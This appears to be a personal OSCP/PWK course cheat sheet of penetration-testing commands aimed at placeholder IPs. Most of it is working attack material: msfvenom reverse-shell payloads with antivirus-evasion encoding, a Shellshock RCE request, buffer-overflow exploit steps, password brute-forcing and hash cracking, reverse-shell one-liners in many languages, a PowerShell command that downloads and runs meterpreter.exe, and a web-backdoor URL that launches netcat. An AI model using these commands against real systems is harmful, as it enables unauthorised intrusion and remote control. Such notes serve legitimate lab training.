# Offsec

Offsec PWK notes and frecuently used files.

<ol>
  <li><a href="#Scanning">Scanning and Enumeration</a></li>
  <li><a href="#Exploitation">Exploitation</a></li>
  <li><a href="#ExploitDevelopment">Exploit Development</a></li>
  <li><a href="#PasswordAttacks">Password Attacks</a></li>
  <li><a href="#ReverseShells">Reverse Shells</a></li>
  <li><a href="#PrivilegeEscalation">Privilege Escalation</a></li>
  <li><a href="#FileTransfers">File Transfers</a></li>
  <li><a href="#PostExploitation">Scanning and Enumeration</a></li>
  <li><a href="#PortForwarding">Port Forwarding</a></li>
  <li><a href="#WebAttacks">Web Attacks</a></li>
  <li><a href="#LessonsLearned">Lessons Learned</a></li>
</ol>

<br>
Target IP: 1.1.1.1
<br>
Local IP: 10.10.10.10 

<div id="Scanning"> <h3>1.Scanning and Enumeration</h3></div>

<h4> NMAP</h4>

    nmap++ 1.1.1.1

<h4> SMB</h4>

    nbtscan -r 1.1.1.1

    enum4linux -USGPoi 1.1.1.1 >> SMB.txt

    smbclient -L 1.1.1.1

    showmount -e 1.1.1.1

<h4> SMTP </h4>

    nmap -p 25 --script smtp-enum-users.nse,smtp-commands.nse 1.1.1.1

<h4> SNMP</h4>

    snmpcheck -t 1.1.1.1 >> ENUM-SNMP.txt

    snmpwalk -c public 1.1.1.1  -v 2c

    onesixtyone -c public.txt -o snmp-onesixtyone.txt -dd 1.1.1.1 

<h4> HTTP</h4>

    nikto -o nikto.html -Display V -nolookup -host 1.1.1.1  && firefox nikto.html

    dirb http://1.1.1.1 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -l -o dirb.txt

    Dirbuster: Change to 50 req/s, no recursion, export simple list. 

<h4> SSH </h4>

    msf > use auxiliary/scanner/ssh/ssh_enumusers

<div id="Exploitation"> <h3>2. Exploitation</h3></div>

<h4>MSF Venom Payload Generation</h4>

    msfvenom -p windows/shell_reverse_tcp -f asp -o shell.asp LHOST=10.10.10.10 LPORT=443

    use exploit/multi/handler
    set payload windows/shell/reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443
    run

<br>

    msfvenom -p windows/meterpreter_reverse_tcp -f exe -o metp.exe -e x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443

    msfconsole

    use exploit/multi/handler
    set payload windows/meterpreter_reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443
    run

<h4>Shellshock RCE</h4>

    curl http://1.1.1.1/cgi-bin/admin.cgi -H"User-Agent:() { :; }; /bin/bash -c ifconfig “

<h4>Compiling .exe Files with mingw32</h4>

    i586-mingw32msvc-gcc MS08-067.c -o MS08-067.exe  -lrpcrt4 -lws2_32 -lwsock32 -lmpr

<div id="ExploitDevelopment"> <h3>3. Exploit Development</h3></div>

<h4>1. Fuzz</h4>

    ./fuzzer.py 

<h4>2. Create a unique pattern and locate the offset for EIP </h4>

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 

<b>Debugger:</b> write down value of EIP (e.g. 39694438)

    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438

<h4>3. Update skeleton script to match new buffer size, pad with a different char (x42) 4 bytes to overwrite EIP. </h4>

<h4>4. Locate space for shell code (i.e add more “C”s ~400 bytes) 
</h4>

    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

<h4>5. Locate bad characters: append to skeleton script right after x42s, Immunity: ESP Follow in Dump </h4>


<h4>6. Find a return address (Typically JMP ESP - FFE4)</h4>

Criteria: 

    1. Does not contain bad characters
    2. Does not use DEP or ASLR 

Using Mona: 

    !mona modules        
    !mona find -s “\xff\xe4” -m slmfc.dll 
 
<h4>7. Update skeleton script to include Ret Address (little endian) right after the buffer </h4>

<h4>8. Update skeleton script to include NOPs for padding at the beggining of the shellcode</h4>

<h4>9. Generate shellcode and update skeleton script </h4>

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x09\x0a" 
    
<b> Bypassing AV and FW restrictions </b>

<h4>10. Use staged payloads </h4>

    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/shell/reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443

<h4>11. Use multiple iterations of the encoder </h4>

    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -i 10 

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/shell/reverse_tcp
    set LHOST 10.10.10.10
    set LPORT 443

<h4>12. Use a Reverse HTTPS Meterpreter </h4>

    msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -i 10 

    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_https
    set LHOST 10.10.10.10
    set LPORT 443

<h4>13. Try other ports common ports (53, 80) </h4>

<div id="PasswordAttacks"> <h3>4. Password Attacks</h3></div>

    ncrack -vv --user rax -P wordlist.txt rdp://1.1.1.1

    medusa -h 1.1.1.1 -u root -P /usr/share/wordlists/rockyou.txt -e ns -M ssh

    hydra -l administrator -P wordlist.txt 1.1.1.1 ssh

    hydra 1.1.1.1:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt

<h4> Password Generation with cewl and John </h4>

    cewl http://1.1.1.1/index.html >> words.txt

    john --wordlist=words.txt --rules --stdout >> wordlist.txt

<h4> Cracking Hashes - Linux </h4>

    cat shadow.txt | awk -F':' '{print }' > hashes.txt

    hashcat -m 500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

    hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

<h4> Cracking Hashes - Windows </h4>

    hashcat -m 1000 -a 0 -o output.txt --remove hashes.txt /usr/share/wordlists/rockyou.txt

<div id="ReverseShells"> <h3>5. Reverse Shells</h3></div>

Local IP: 10.10.10.10 
<br> 

<h4>Bash</h4>

    bash -i >& /dev/tcp/10.10.10.10/7777 0>&1
    
    sh -i >& /dev/tcp/10.10.10.10/7777 0>&1

<h4>PERL</h4>

    perl -e 'use Socket;$i="10.10.10.10";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

<h4>Python</h4>

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10”,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

<h4>PHP</h4>

    php -r '$sock=fsockopen("10.10.10.10”,7777);exec("/bin/sh -i <&3 >&3 2>&3");'

<h4>Ruby</h4>

    ruby -rsocket -e'f=TCPSocket.open("10.10.10.10”,7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

<h4>Netcat</h4>

<b>Linux</b>

    nc -vn 10.10.10.10 7777 -e /bin/sh 

<b>Windows</b>

    nc.exe -vn 10.10.10.10 7777 -e cmd.exe

<h4>Java</h4>


    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/7777;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()


<h4>Powershell</h4>
 
    powershell.exe

    $client = New-Object System.Net.Sockets.TCPClient(“10.10.10.10”,7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

<br>

PowerShell with nc.exe or another rev shell .exe

    PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/files/meterpreter.exe','meterpreter.exe');Start-Process ‘meterpreter.exe'

<h4>Windows (Web app with command execution and nc.exe) </h4>

http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22

